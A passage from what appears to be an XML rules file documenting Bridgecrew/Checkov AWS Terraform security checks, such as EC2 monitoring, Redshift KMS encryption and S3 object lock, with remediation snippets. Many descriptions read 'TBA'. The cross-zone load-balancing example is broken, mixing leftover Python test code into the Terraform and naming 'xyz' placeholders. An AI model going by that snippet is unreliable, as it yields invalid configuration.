<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_cloudformation_stack</li>
<li><strong>Argument:</strong> notification_arns</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_cloudformation_stack" "default" {
    name = "networking-stack"
    ...
 +  notification_arns = ["arn1", "arn2"]
  }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-cloudformation-stacks-are-sending-event-notifications-to-an-sns-topic' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-cloudformation-stacks-are-sending-event-notifications-to-an-sns-topic</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-cloudformation-stacks-are-sending-event-notifications-to-an-sns-topic' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_126</key>
    <name>Ensure detailed monitoring for EC2 instances is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="detailed-monitoring-for-ec2-instances-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-detailed-monitoring-for-ec-2-instances-is-disabled"></div>Detailed monitoring for EC2 instances is disabled</div><a aria-label="Skip link to Detailed monitoring for EC2 instances is disabled" class="heading-anchor-icon fa fa-anchor" href="#detailed-monitoring-for-ec2-instances-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_instance</li>
<li><strong>Argument:</strong> monitoring</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_instance" "test" {
+  monitoring = true   
 }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-detailed-monitoring-is-enabled-for-ec2-instances' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-detailed-monitoring-is-enabled-for-ec2-instances</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-detailed-monitoring-is-enabled-for-ec2-instances' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_127</key>
    <name>Ensure Elastic Load Balancers use SSL certificates provided by AWS Certificate Manager</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="elastic-load-balancers-do-not-use-ssl-certificates-provided-by-aws-certificate-manager"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-elastic-load-balancers-do-not-use-ssl-certificates-provided-by-aws-certificate-manager"></div>Elastic load balancers do not use SSL Certificates provided by AWS Certificate Manager</div><a aria-label="Skip link to Elastic load balancers do not use SSL Certificates provided by AWS Certificate Manager" class="heading-anchor-icon fa fa-anchor" href="#elastic-load-balancers-do-not-use-ssl-certificates-provided-by-aws-certificate-manager"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_elb</li>
<li><strong>Argument:</strong> ssl_certificate_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_elb" "test" {
  ...
  listener {
    instance_port      = 8000
    instance_protocol  = "http"
    lb_port            = 443
    lb_protocol        = "https"
+   ssl_certificate_id = "arn:aws:iam::123456789012:server-certificate/certName"
  }           
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-elastic-load-balancers-uses-ssl-certificates-provided-by-aws-certificate-manager' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-elastic-load-balancers-uses-ssl-certificates-provided-by-aws-certificate-manager</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-elastic-load-balancers-uses-ssl-certificates-provided-by-aws-certificate-manager' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_137</key>
    <name>Ensure that Elasticsearch is configured inside a VPC</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-elasticsearch-cluster-is-not-in-a-vpc"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-elastic-search-cluster-is-not-in-a-vpc"></div>AWS ElasticSearch cluster is not in a VPC</div><a aria-label="Skip link to AWS ElasticSearch cluster is not in a VPC" class="heading-anchor-icon fa fa-anchor" href="#aws-elasticsearch-cluster-is-not-in-a-vpc"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS Elasticsearch domains that reside within a VPC have an extra layer of security when compared to ES domains that use public endpoints. Launching an Amazon ES cluster within an AWS VPC enables secure communication between the ES cluster (domain) and other AWS services without the need for an Internet Gateway, a NAT device or a VPN connection and all traffic remains secure within the AWS Cloud.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_elasticsearch_domain</li>
<li><strong>Argument:</strong> vpc_options</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_elasticsearch_domain" "es" {
          domain_name           = var.domain
          elasticsearch_version = "6.3"
        
          cluster_config {
            instance_type = "m4.large.elasticsearch"
          }
        
+         vpc_options {
+           subnet_ids = [
+             data.aws_subnet_ids.selected.ids[0],
+             data.aws_subnet_ids.selected.ids[1],
+           ]
        
            security_group_ids = [aws_security_group.es.id]
          }
        
        }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-elasticsearch-is-configured-inside-a-vpc' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-elasticsearch-is-configured-inside-a-vpc</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-elasticsearch-is-configured-inside-a-vpc' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_138</key>
    <name>Ensure ELB has cross-zone-load-balancing enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-elb-has-cross-zone-load-balancing-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-elb-has-cross-zone-load-balancing-disabled"></div>AWS ELB has cross-zone load balancing disabled</div><a aria-label="Skip link to AWS ELB has cross-zone load balancing disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-elb-has-cross-zone-load-balancing-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Cross-zone load balancing reduces the need to maintain equivalent numbers of instances in each enabled Availability Zone, and improves your application's ability to handle the loss of one or more instances.<br/>
This would also guarantee better fault tolerance and more consistent traffic flow. If one of the availability zones registered with the ELB fails (as result of network outage or power loss), the load balancer with the Cross-Zone Load Balancing activated would act as a traffic guard, stopping any request being sent to the unhealthy zone and routing it to the other zones.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> xyz</li>
<li><strong>Argument:</strong> xyz [this will be for composite checks and will indicate a specific resource]</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_elb" "test_success" {
              name               = "foobar-terraform-elb"
              availability_zones = ["us-west-2a", "us-west-2b", "us-west-2c"]
              access_logs {
                bucket        = "foo"
                bucket_prefix = "bar"
                interval      = 60
              }
              listener {
                instance_port     = 8000
                instance_protocol = "http"
                lb_port           = 80
                lb_protocol       = "http"
              }
              listener {
                instance_port      = 8000
                instance_protocol  = "http"
                lb_port            = 443
                lb_protocol        = "https"
                ssl_certificate_id = "arn:aws:iam::123456789012:server-certificate/certName"
              }
              health_check {
                healthy_threshold   = 2
                unhealthy_threshold = 2
                timeout             = 3
                target              = "HTTP:8000/"
                interval            = 30
              }
              instances                   = [aws_instance.foo.id]
              idle_timeout                = 400
              connection_draining         = true
              connection_draining_timeout = 400
            }
            """)
        resource_conf = hcl_res['resource'][0]['aws_elb']['test_success']
        scan_result = check.scan_resource_conf(conf=resource_conf)
        self.assertEqual(CheckResult.PASSED, scan_result)

    def test_success(self):
        hcl_res = hcl2.loads("""
            resource "aws_elb" "test_success" {
              name               = "foobar-terraform-elb"
              availability_zones = ["us-west-2a", "us-west-2b", "us-west-2c"]
              access_logs {
                bucket        = "foo"
                bucket_prefix = "bar"
                interval      = 60
              }
              listener {
                instance_port     = 8000
                instance_protocol = "http"
                lb_port           = 80
                lb_protocol       = "http"
              }
              listener {
                instance_port      = 8000
                instance_protocol  = "http"
                lb_port            = 443
                lb_protocol        = "https"
                ssl_certificate_id = "arn:aws:iam::123456789012:server-certificate/certName"
              }
              health_check {
                healthy_threshold   = 2
                unhealthy_threshold = 2
                timeout             = 3
                target              = "HTTP:8000/"
                interval            = 30
              }
              instances                   = [aws_instance.foo.id]
+             cross_zone_load_balancing   = true
              idle_timeout                = 400
              connection_draining         = true
              connection_draining_timeout = 400
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-elb-is-cross-zone-load-balancing-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-elb-is-cross-zone-load-balancing-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-elb-is-cross-zone-load-balancing-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_139</key>
    <name>Ensure RDS clusters and instances have deletion protection enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="rds-clusters-and-instances-have-deletion-protection-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-rds-clusters-and-instances-have-deletion-protection-disabled"></div>RDS clusters and instances have deletion protection disabled</div><a aria-label="Skip link to RDS clusters and instances have deletion protection disabled" class="heading-anchor-icon fa fa-anchor" href="#rds-clusters-and-instances-have-deletion-protection-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_rds_cluster</li>
<li><strong>Argument:</strong> deletion_protection</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_rds_cluster" "default" {
  ...
+ deletion_protection = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-rds-clusters-and-instances-have-deletion-protection-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-rds-clusters-and-instances-have-deletion-protection-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-rds-clusters-and-instances-have-deletion-protection-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_140</key>
    <name>Ensure RDS global clusters are encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="unencrypted-rds-global-clusters"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-unencrypted-rds-global-clusters"></div>Unencrypted RDS global clusters </div><a aria-label="Skip link to Unencrypted RDS global clusters " class="heading-anchor-icon fa fa-anchor" href="#unencrypted-rds-global-clusters"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_rds_global_cluster</li>
<li><strong>Argument:</strong> storage_encrypted </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_rds_global_cluster" "example" {
  ...
+ storage_encrypted         = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-rds-global-clusters-are-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-rds-global-clusters-are-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-rds-global-clusters-are-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_141</key>
    <name>Ensure Redshift cluster allow version upgrade by default</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="redshift-clusters-version-upgrade-is-not-default"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-redshift-clusters-version-upgrade-is-not-default"></div>Redshift clusters version upgrade is not default</div><a aria-label="Skip link to Redshift clusters version upgrade is not default" class="heading-anchor-icon fa fa-anchor" href="#redshift-clusters-version-upgrade-is-not-default"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>With Allow Version Upgrade feature enabled, the Amazon Redshift engine upgrades (also known as major version upgrades) will occur automatically so the data warehouse service engine can get the newest features, bug fixes or the latest security patches released.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>Run modify-cluster command (OSX/Linux/UNIX) using the name of the cluster that you want to update as identifier (see Audit section part II, step no. 2) to enable AWS Redshift engine version upgrades for the selected cluster:</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws redshift modify-cluster
    --region us-east-1
    --cluster-identifier cc-cluster
    --allow-version-upgrade
</code></pre></div></div>
<ol start="2">
<li>If successful, the command output should return the Redshift cluster new configuration metadata:</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">{
    "Cluster": {
        "PubliclyAccessible": true,
        "NumberOfNodes": 1,
        "PendingModifiedValues": {},
        "VpcId": "vpc-2eb53422",
        "ClusterVersion": "1.0",
        "AutomatedSnapshotRetentionPeriod": 1,
        "ClusterParameterGroups": [
       ...
        "AllowVersionUpgrade": true,
       ...
        "ClusterSubnetGroupName": "default",
        "ClusterSecurityGroups": [],
        "ClusterIdentifier": "cc-cluster",
        "AvailabilityZone": "us-east-1a",
        "NodeType": "ds1.xlarge",
        "ClusterStatus": "available"
    }
}
</code></pre></div></div>
<ol start="3">
<li>
<p>Repeat step no. 1 and 2 for other Redshift clusters with engine version upgrades disabled, available in the current region.</p>
</li>
<li>
<p>Change the AWS region by updating the --region command parameter value and repeat steps no. 1 - 3 for other regions.</p>
</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_redshift_cluster</li>
<li><strong>Argument:</strong> allow_version_upgrade</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_redshift_cluster" "default" {
  ...
+ allow_version_upgrade = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-redshift-clusters-allow-version-upgrade-by-default' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-redshift-clusters-allow-version-upgrade-by-default</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-redshift-clusters-allow-version-upgrade-by-default' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_142</key>
    <name>Ensure Redshift cluster is encrypted by KMS</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="redshift-cluster-is-not-encrypted-by-kms"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-redshift-cluster-is-not-encrypted-by-kms"></div>Redshift cluster is not encrypted by KMS</div><a aria-label="Skip link to Redshift cluster is not encrypted by KMS" class="heading-anchor-icon fa fa-anchor" href="#redshift-cluster-is-not-encrypted-by-kms"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_redshift_cluster</li>
<li><strong>Argument:</strong> kms_key_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_redshift_cluster" "test" {
  ...
+ kms_key_id         = "someKey"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-redshift-cluster-is-encrypted-by-kms' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-redshift-cluster-is-encrypted-by-kms</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-redshift-cluster-is-encrypted-by-kms' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_143</key>
    <name>Ensure S3 bucket has lock configuration enabled by default</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="s3-bucket-lock-configuration-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-s-3-bucket-lock-configuration-disabled"></div>S3 bucket lock configuration disabled</div><a aria-label="Skip link to S3 bucket lock configuration disabled" class="heading-anchor-icon fa fa-anchor" href="#s3-bucket-lock-configuration-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Object Lock is an Amazon S3 feature that blocks object version deletion during a user-defined retention period, to enforce retention policies as an additional layer of data protection and/or for strict regulatory compliance. The feature provides two ways to manage object retention: retention periods and legal holds. A retention period specifies a fixed time frame during which an S3 object remains locked, meaning that it can't be overwritten or deleted. A legal hold implements the same protection as a retention period, but without an expiration date. Instead, a legal hold remains active until you explicitly remove it.<br/>
Ensure that your Amazon S3 buckets have Object Lock feature enabled in order to prevent the objects they store from being deleted. Used in combination with versioning, which protects objects from being overwritten, AWS S3 Object Lock enables you to store your S3 objects in an immutable form, providing an additional layer of protection against object changes and deletion. S3 Object Lock feature can also help you meet regulatory requirements within your organization when it comes to data protection.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Sign in to AWS Management Console.</li>
<li>Navigate to S3 dashboard at <a href="https://console.aws.amazon.com/s3/" target="_self">https://console.aws.amazon.com/s3/</a>.</li>
<li>Click + Create bucket button to start the setup process.</li>
<li>Within Create bucket dialog box, perform the following:</li>
</ol>
<ul>
<li>For step 1: Name and region:<ul>
<li>Provide a unique name for the new bucket in the Bucket name box.</li>
<li>From Region dropdown box, select the AWS region where the new S3 bucket will be created.</li>
<li>From Copy settings from an existing bucket dropdown list, select the name of the S3 bucket that you want to re-create.</li>
<li>Click Next to continue the process.</li>
</ul></li>
<li>For step 2: Configure options:<ul>
